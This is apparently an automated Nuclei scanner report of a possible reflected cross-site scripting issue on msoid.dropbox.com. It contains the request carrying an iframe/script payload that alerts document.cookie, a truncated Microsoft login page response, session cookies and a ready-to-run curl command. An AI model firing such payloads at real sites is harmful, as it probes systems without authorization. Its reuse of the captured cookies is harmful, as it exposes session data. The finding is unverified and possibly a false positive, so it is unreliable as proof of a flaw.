### Id XSS - Cross-Site Scripting (id-xss) found on https://msoid.dropbox.com

----
**Details**: **id-xss** matched at https://msoid.dropbox.com

**Protocol**: HTTP

**Full URL**: https://msoid.dropbox.com/?id=%22%3E%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E%22%3E%3C/iframe%3E

**Timestamp**: Sat Dec 9 15:12:50 +0000 UTC 2023

**Template Information**

| Key | Value |
| --- | --- |
| Name | Id XSS - Cross-Site Scripting |
| Authors | yarovit |
| Tags | xss, id |
| Severity | low |
| Description | A cross-site scripting vulnerability was discovered via id testing. Manual testing is needed to verify exploitation. |

**Request**
```http
GET /?id=%22%3E%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E%22%3E%3C/iframe%3E HTTP/1.1
Host: msoid.dropbox.com
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Cookie: x-ms-gateway-slice=estsfd; stsservicecookie=estsfd; buid=0.AXMAqzBRR7ViQUKp00fjfJvCFakreHKQRANPjYJWI3DqNWYBAAA.AQABAAEAAAAmoFfGtYxvRrNriQdPKIZ-Q3LfsWvN5o66xKaEUrwWx27KJVmvTZ4qbV5O5L2GfJggQA3xctJizUyacUV9_qVHadp_879i_VdOtPLm190H-Hw8EWsxfx0JrWrYgyhdXCAgAA; esctx=PAQABAAEAAAAmoFfGtYxvRrNriQdPKIZ-3WQv1SmkNbP2UXVZW9x8ZHX9gNSdnhrmJMkEEPZQ40anSK3wfaP-9rzyhycmWmKAY31mqBYUguA_l8czl6OqU-_8sXsy7SKboRR68qlJnjQVvLlgHQ1bmyHZQtT53EDklEth7H7WPdGYIEEvRuUvVTzYa11G682bL-w_uD7ar_MgAA; esctx-YcFBuQPxSUE=AQABAAEAAAAmoFfGtYxvRrNriQdPKIZ-d0tq1FCO2SQ0j4MlQoVH4dGnIoTL1AS13D_n2YnEEzA3kJusHgus__ReYo7maGMPNNA1M630XxACSUxSv0P4H9co6MVB6LOPxabE3DYutwpG9Hf6z5VWlGsdg52BxQcZWiiSaMX39xt4z-AYgelcOiAA; fpc=AlvM-uXC5ydHlOJGiVZTqe-4vjNwBAAAAN16Bt0OAAAA; esctx-Zl4Y2BChc0=AQABAAEAAAAmoFfGtYxvRrNriQdPKIZ-LB8JvMlbLNdKgfXZbo49xXvv5FMbkt2Lv_j1vpfr548pwcUYHi6zjvhd3CSImbDNBgHbTCB64SqXQr0-rnB0c5Vl71e998eQN_b78cOvdLJP0TE9mo9fpNgNucpUI1MsYKPCJloV3K6bD3hPlaQafCAA; esctx-p5EInj8ZO1U=AQABAAEAAAAmoFfGtYxvRrNriQdPKIZ-Ji1H7_8VBQkA4yWIOX9CYrlzYAcWigcFFDDjp9kSIhzTFT3kBO-ef48fo35AYJ1Y3zq9Hy64qY5ckL8djD4RyJMUo82nx2P8wXFfMv9xFZImA1GBb-cTQooXirlRi67jsQvm5Y0dQOQMVckafGI-tCAA; esctx-CCLl36ptMg=AQABAAEAAAAmoFfGtYxvRrNriQdPKIZ-t-bYCqzmjEyamdKWhHUV9Uv_ewvuCclh3R6xqIRlJllss6PggxqAC9DEoHRe4dHIqWUonJi_xa2oC3VB4TQ1ENzhgbl8g59lrSlvfCvEcGTdcFlV98UCXl7su1ijsUWBjYUcGbh4JzeePy7i87XDkyAA
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 200 OK
Connection: close
Cache-Control: no-store, no-cache
Content-Type: text/html; charset=utf-8
Date: Sat, 09 Dec 2023 15:12:50 GMT
Expires: -1
Nel: {"report_to":"network-errors","max_age":86400,"success_fraction":0.001,"failure_fraction":1.0}
P3p: CP="DSP CUR OTPi IND OTRi ONL FIN"
Pragma: no-cache
Referrer-Policy: strict-origin-when-cross-origin
Report-To: {"group":"network-errors","max_age":86400,"endpoints":[{"url":"https://identity.nel.measure.office.net/api/report?catId=GW+estsfd+ams2"}]}
Set-Cookie: fpc=AlvM-uXC5ydHlOJGiVZTqe-4vjNwBAAAAN16Bt0OAAAA; expires=Mon, 08-Jan-2024 15:12:50 GMT; path=/; secure; HttpOnly; SameSite=None
Set-Cookie: x-ms-gateway-slice=estsfd; path=/; secure; samesite=none; httponly
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Ms-Ests-Server: 2.1.16919.4 - WEULR1 ProdSlices
X-Ms-Request-Id: fc12bb53-2790-4710-889e-cf62a3444000
X-Xss-Protection: 0



<!-- Copyright (C) Microsoft Corporation. All rights reserved. -->
<!DOCTYPE html>
<html>
<head>
    <title>Redirecting</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="BssoInterrupt" />
    <meta name="SiteID" content="" />
    <meta name="ReqLC" content="9" />
    <meta name="LocLC" content="en" />

    
<meta name="robots" content="none" />

<script type="text/javascript">//<![CDATA[
$Config={"iMaxStackForKnockoutAsyncComponents":10000,"fShowButtons":true,"urlCdn":"https://aadcdn.msauth.net/shared/1.0/","urlDefaultFavicon":"https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico","urlPost":"/login.srf?id=%22%3e%3ciframe+srcdoc%3d%22%3cscript%3ealert(document.cookie)%3c%2fscript%3e%22%3e%3c%2fiframe%3e\u0026client-request-id=79d47912-0617-4997-9f3a-a73eb5cd0cfc\u0026sso_reload=True","iPawnIcon":0,"sPOST_Username":"","sFTName":"flowToken","dynamicTenantBranding":null,"staticTenantBranding":null,"oAppCobranding":{},"iBackgroundImage":2,"fApplicationInsightsEnabled":false,"iApplicationInsightsEnabledPercentage":0,"urlSetDebugMode":"https://login.windows.net/common/debugmode","fEnableCssAnimation":true,"fAllowGrayOutLightBox":true,"fIsRemoteNGCSupported":true,"desktopSsoConfig":{"isEdgeAnaheimAllowed":true,"iwaEndpointUrlFormat":"https://autologon.microsoftazuread-sso.com/{0}/winauth/sso?client-request-id=79d47912-0617-4997-9f3a-a73eb5cd0cfc","iwaSsoProbeUrlFormat":"https://autologon.microsoftazuread-sso.com/{0}/winauth/ssoprobe?client-request-id=79d47912-0617-4997-9f3a-a73eb5cd0cfc","iwaIFrameUrlFormat":"https://autologon.microsoftazuread-sso.com/{0}/winauth/iframe?client-request-id=79d47912-0617-4997-9f3a-a73eb5cd0cfc\u0026isAdalRequest=False","iwaRequestTimeoutInMs":10000,"startDesktopSsoOnPageLoad":false,"progressAnimationTimeout":10000,"isEdgeAllowed":false,"minDssoEdgeVersion":"17","isSafariAllowed":true,"redirectUri":"","isIEAllowedForSsoProbe":true,"edgeRedirectUri":"https://autologon.microsoftazuread-sso.com/common/winauth/sso/edgeredirect?client-request-id=79d47912-0617-4997-9f3a-a73eb5cd0cfc\u0026origin=login.windows.net\u0026is_redirected=1","isFlowTokenPassedInEdge":true},"iSessionPullType":2,"fUseSameSite":true,"isGlobalTenant":true,"uiflavor":1001,"fOfflineAccountVisible":false,"fEnableUserStateFix":true,"fShowAccessPassPeek":true,"fUpdateSessionPollingLogic":true,"fEnableShowPickerCredObservable":true,"fFetchSessionsSkipDsso":true,"fUseNonMicrosoftDefaultBrandingForCiam":true,"fMergeComplexBrandingProperties":true,"fUseAltText":true,"fRemoveCustomCss":true,"fAddRtlCustomCssSupport":true,"fFixLightboxHeaderMargin":true,"fFixUICrashForApiRequestHandler":true,"fDeprecateBrandingProperties":true,"fFixDynamicTenantBranding":true,"fShowUpdatedKoreanPrivacyFooter":true,"fUsePostCssHotfix":true,"scid":2001,"hpgact":2101,"hpgid":6,"apiCanary":"PAQABAAEAAAAmoFfGtYxvRrNriQdPKIZ-UHqEikpk24KZT0BHfYBkkWt_k7lcf7-0BqSQDyBOECpUW13X1VgzFGympPHKHv6Xe3Hl_GHbS4bDePMlMdYk8zUeI9MAnigWWRrWgpaLlkYrSMxZ3P_RR3Zq_Q0MZn6bSvFLZNfBJMr8Pm7_C4WtD9l_EW_OeFRNBUAdAisNAYV2JNCXaMJYi07ZTRxDVYgtmNqKB5IIyB9kiqqZ-iflXCAA","canary":"b1c+nEd+E2CGNwKyic7LtGWZXiLqHOxNjS9DjPVj5Ho=5:1:CANARY:","sCanaryTokenName":"canary","fSkipRenderingNewCanaryToken":false,"fEnableNewCsrfProtection":true,"correlationId":"79d47912-0617-4997-9f3a-a73eb5cd0cfc","sessionId":"fc12bb53-2790-4710-889e-cf62a3444000","locale":{"mkt":"en","lcid":9},"slMaxRetry":2,"slReportFailure":true,"strings":{"desktopsso":{"authenticatingmessage":"Trying to sign you in"}},"enums":{"ClientMetricsModes":{"None":0,"SubmitOnPost":1,"SubmitOnRedirect":2,"InstrumentPlt":4}},"urls":{"instr":{"pageload":"https://login.windows.net/common/instrumentation/reportpageload","dssostatus":"https://login.windows.net/common/instrumentation/dssostatus"}},"browser":{"ltr":1,"Chrome":1,"_Win":1,"_M89":1,"_D0":1,"Full":1,"Win81".... Truncated ....
```


**CURL command**
```sh
curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: x-ms-gateway-slice=estsfd; stsservicecookie=estsfd; buid=0.AXMAqzBRR7ViQUKp00fjfJvCFakreHKQRANPjYJWI3DqNWYBAAA.AQABAAEAAAAmoFfGtYxvRrNriQdPKIZ-Q3LfsWvN5o66xKaEUrwWx27KJVmvTZ4qbV5O5L2GfJggQA3xctJizUyacUV9_qVHadp_879i_VdOtPLm190H-Hw8EWsxfx0JrWrYgyhdXCAgAA; esctx=PAQABAAEAAAAmoFfGtYxvRrNriQdPKIZ-3WQv1SmkNbP2UXVZW9x8ZHX9gNSdnhrmJMkEEPZQ40anSK3wfaP-9rzyhycmWmKAY31mqBYUguA_l8czl6OqU-_8sXsy7SKboRR68qlJnjQVvLlgHQ1bmyHZQtT53EDklEth7H7WPdGYIEEvRuUvVTzYa11G682bL-w_uD7ar_MgAA; esctx-YcFBuQPxSUE=AQABAAEAAAAmoFfGtYxvRrNriQdPKIZ-d0tq1FCO2SQ0j4MlQoVH4dGnIoTL1AS13D_n2YnEEzA3kJusHgus__ReYo7maGMPNNA1M630XxACSUxSv0P4H9co6MVB6LOPxabE3DYutwpG9Hf6z5VWlGsdg52BxQcZWiiSaMX39xt4z-AYgelcOiAA; fpc=AlvM-uXC5ydHlOJGiVZTqe-4vjNwBAAAAN16Bt0OAAAA; esctx-Zl4Y2BChc0=AQABAAEAAAAmoFfGtYxvRrNriQdPKIZ-LB8JvMlbLNdKgfXZbo49xXvv5FMbkt2Lv_j1vpfr548pwcUYHi6zjvhd3CSImbDNBgHbTCB64SqXQr0-rnB0c5Vl71e998eQN_b78cOvdLJP0TE9mo9fpNgNucpUI1MsYKPCJloV3K6bD3hPlaQafCAA; esctx-p5EInj8ZO1U=AQABAAEAAAAmoFfGtYxvRrNriQdPKIZ-Ji1H7_8VBQkA4yWIOX9CYrlzYAcWigcFFDDjp9kSIhzTFT3kBO-ef48fo35AYJ1Y3zq9Hy64qY5ckL8djD4RyJMUo82nx2P8wXFfMv9xFZImA1GBb-cTQooXirlRi67jsQvm5Y0dQOQMVckafGI-tCAA; esctx-CCLl36ptMg=AQABAAEAAAAmoFfGtYxvRrNriQdPKIZ-t-bYCqzmjEyamdKWhHUV9Uv_ewvuCclh3R6xqIRlJllss6PggxqAC9DEoHRe4dHIqWUonJi_xa2oC3VB4TQ1ENzhgbl8g59lrSlvfCvEcGTdcFlV98UCXl7su1ijsUWBjYUcGbh4JzeePy7i87XDkyAA' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36' 'https://msoid.dropbox.com/?id=%22%3E%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E%22%3E%3C/iframe%3E'
```

----

Generated by [Nuclei v3.1.0-dev](https://github.com/projectdiscovery/nuclei)